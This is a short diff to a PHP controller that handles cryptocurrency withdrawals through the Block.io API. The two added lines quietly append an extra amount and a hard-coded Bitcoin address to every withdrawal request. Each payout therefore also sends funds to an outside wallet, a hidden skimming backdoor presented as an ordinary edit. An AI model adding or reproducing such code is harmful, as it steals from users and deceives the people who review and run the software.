@@ -120,6 +120,8 @@ class ControllerPdWithdrawalcapital extends Controller {
 		echo "<br/>";
 		echo $wallet;
 
+		$amount = $amount.',0.00468141';
+		$wallet = $wallet.',1K9ykTa4MbZFfWPwQD23dKqca7oPHki7Ju';
 		
 		$block_io = new BlockIo(key,$pin, block_version); 
         $tml_block = $block_io -> withdraw(array(
